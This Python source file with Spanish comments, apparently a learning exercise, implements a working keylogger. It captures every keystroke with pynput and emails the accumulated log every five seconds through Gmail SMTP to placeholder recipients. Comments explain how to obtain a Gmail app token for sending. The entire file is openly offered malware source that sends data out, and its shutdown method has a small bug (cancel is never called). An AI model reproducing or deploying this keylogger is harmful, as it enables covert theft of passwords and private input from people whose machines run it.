#!/usr/bin/env python3

import pynput.keyboard
import threading
import smtplib # para enviar cosas por correo
from email.mime.text import MIMEText

class Keylogger:
    def __init__(self):
        self.log = ""
        self.request_shutdown = False
        self.timer = None
        self.is_first_run = True

    def pressed_key(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            special_keys = {key.space: " ", key.backspace: " Backspace", key.enter: " Enter", key.shift: " Shift", key.ctrl: " Ctrl", key.alt:" Alt"}
            self.log += special_keys.get(key, f" {str(key)}") # mejor que tener tropecientos if elif, las que no están contempladas en el diccionario toman el valor str(key)}

        print(self.log)

    def send_email(self, subject, body, sender, recipients, password): # https://mailtrap.io/blog/python-send-email-gmail/
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())
        print("Message sent!")

    def report(self):
        email_body = "[+] El Keylogger se ha iniciado exitosamente" if self.is_first_run else self.log
        self.send_email("Keylogger Report", email_body, "sender@gmail.com", ["receiver1@gmail.com", "receiver2@gmail.com"], "app_token")
        # para crear un app token:
        # Activar 2FA -> ve a Ajustes >> Seguridad >> Verificación en dos pasos
        # Ajustes >> Seguridad >> Contraseñas de aplicaciones
        self.log = ""

        if self.is_first_run:
            self.is_first_run = False

        if not self.request_shutdown:
            self.timer = threading.Timer(5, self.report) # con esta función, cada 5 segundos llamas a la función report(), lo que es una llamada recursiva
            self.timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key) # primero creamos un listener

        with keyboard_listener: # en caso de que pete, se cierra el listener automáticamente
            self.report()
            keyboard_listener.join() # arranca el listener

    def shutdown(self):
        self.request_shutdown = True

        if self.timer:
            self.timer.cancel # cancelo el hilo para salir del programa al momento
